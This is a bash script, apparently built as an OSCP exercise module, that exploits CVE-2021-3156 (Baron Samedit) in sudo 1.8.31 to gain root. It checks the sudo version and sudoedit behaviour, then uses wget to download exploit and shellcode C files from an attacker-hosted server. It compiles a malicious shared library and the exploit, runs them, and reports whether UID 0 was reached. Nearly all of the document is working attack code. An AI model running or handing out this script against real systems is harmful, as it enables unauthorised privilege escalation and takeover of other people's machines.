echo "[*] CVE-2021-3156 Exploit Module - sudo 1.8.31 (Baron Samedit)"
echo "[*] Credit goes to CptGibbon https://github.com/Whiteh4tWolf/Sudo-1.8.31-Root-Exploit"
echo "[*] Starting vulnerability checks..."
#!/bin/bash

# -----------------------------------------------------------------
#  CVE-2021-3156 (Baron Samedit) Exploit Module
#  For OSCP / educational use. Requires attacker-hosted C files.
# -----------------------------------------------------------------

# === Parse attacker IP and port ===
KALI_IP=""
KALI_PORT="80"  # default

while [[ $# -gt 0 ]]; do
    case $1 in
        --ip)
            KALI_IP="$2"
            shift 2
            ;;
        --port)
            KALI_PORT="$2"
            shift 2
            ;;
        *)
            echo "[-] Unknown option: $1"
            exit 1
            ;;
    esac
done

if [ -z "$KALI_IP" ]; then
    echo "[-] Missing --ip argument (Kali webserver IP)"
    echo "Usage: $0 --ip <KALI_IP> [--port <PORT>]"
    exit 1
fi

echo "[*] Using attacker server at $KALI_IP:$KALI_PORT"

# === Step 1: Check sudo version ===
if ! sudo -V 2>/dev/null | grep -q '1.8.31'; then
    echo "[-] sudo version is not 1.8.31 — skipping"
    exit 2
fi

# === Step 2: sudoedit behavior check ===
output=$(sudoedit -s / 2>&1)
if echo "$output" | grep -qi 'usage'; then
    echo "[-] Patched sudoedit behavior — likely not vulnerable"
    exit 2
fi
echo "[+] sudoedit returned password prompt — likely vulnerable"

# === Step 3: Find usable compiler ===
COMPILERS=("gcc" "gcc-11" "gcc-10" "gcc-9" "clang")
COMPILER_BIN=""

for compiler in "${COMPILERS[@]}"; do
    path=$(command -v "$compiler" 2>/dev/null)
    if [ -x "$path" ]; then
        COMPILER_BIN="$path"
        break
    fi
done

if [ -z "$COMPILER_BIN" ]; then
    echo "[-] No usable compiler found"
    exit 2
fi
echo "[+] Found compiler: $COMPILER_BIN"

# === Step 4: Setup and download ===
WORKDIR="/tmp/sudo_3156_work"
mkdir -p "$WORKDIR/libnss_x"
cd "$WORKDIR" || exit 1

wget http://$KALI_IP:$KALI_PORT/sudo-1.8.31/exploit.c -O exploit.c || exit 1
wget http://$KALI_IP:$KALI_PORT/sudo-1.8.31/shellcode.c -O shellcode.c || exit 1
chmod 644 exploit.c shellcode.c

# === Step 5: Compile ===
$COMPILER_BIN -O3 -shared -nostdlib -o libnss_x/x.so.2 shellcode.c || exit 1
$COMPILER_BIN -O3 -o exploit exploit.c || exit 1

# === Step 6: Run ===
./exploit
if [ "$(id -u)" -eq 0 ]; then
    echo "[+] CVE-2021-3156 succeeded — UID 0"
    exit 0
else
    echo "[-] Exploit failed — still $(whoami)"
    exit 1
fi
